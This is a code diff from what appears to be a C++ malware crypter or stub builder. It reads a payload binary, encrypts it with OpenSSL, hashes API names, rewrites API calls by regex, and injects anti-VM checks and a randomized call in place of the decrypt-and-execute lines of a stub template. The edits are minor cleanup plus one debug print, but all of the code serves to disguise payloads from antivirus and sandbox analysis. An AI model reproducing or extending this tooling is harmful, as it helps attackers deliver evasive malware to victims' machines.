@@ -23,7 +23,6 @@
 
 using namespace std;
 
-/**/
 void setColor(int color) {
     SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
 }
@@ -72,7 +71,7 @@ DWORD getHashFromString(const char *string){
 
     return hash;
 }
-// Returns bytes of binary
+
 vector<unsigned char> readBinary(string &path_to_payload) {
     ifstream file(path_to_payload, ios::binary | ios::ate);
     setColor(COLOR_ERROR);
@@ -143,7 +142,6 @@ vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<uns
     return ciphertext;
 }
 
-
 vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
     EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
     if (!ctx) {
@@ -176,11 +174,11 @@ vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<uns
 
     return plaintext;
 }
-//
-void replaceAPICalls(std::string& line, const std::map<std::string, std::string>& replacements) {
-    for (const auto& pair : replacements) {
-        std::regex apiRegex("\\b" + pair.first + "\\b");
-        line = std::regex_replace(line, apiRegex, pair.second);
+
+void replaceAPICalls(string &line, const map<string, string> &replacements) {
+    for (const auto &pair : replacements) {
+        regex apiRegex("\\b" + pair.first + "\\b");
+        line = regex_replace(line, apiRegex, pair.second);
     }
 }
 
@@ -294,6 +292,7 @@ void writeStub(bool *flags, string &stub_name, string &stubTemplatePath, string 
 
         // Process --vm before --dyn in any case
         if (flags[VM] == true) {
+            cout << "\nsearching for vm";
             if (placeholders[VM_DEF_POS] == true) {
                 if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
                     line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
@@ -369,8 +368,8 @@ void writeStub(bool *flags, string &stub_name, string &stubTemplatePath, string 
                 }
             }
             if(placeholders[RAND_CALL_POS] == true){
-                if ((pos = line.find("execute(payload);")) != string::npos) {
-                    line.replace(pos, strlen("execute(payload);"), RAND_CALL);
+                if ((pos = line.find("vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);\nexecute(payload);")) != string::npos) {
+                    line.replace(pos, strlen("vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);\nexecute(payload);"), RAND_CALL);
                     cout << "Set rand call successfully\n";
                 }
             }
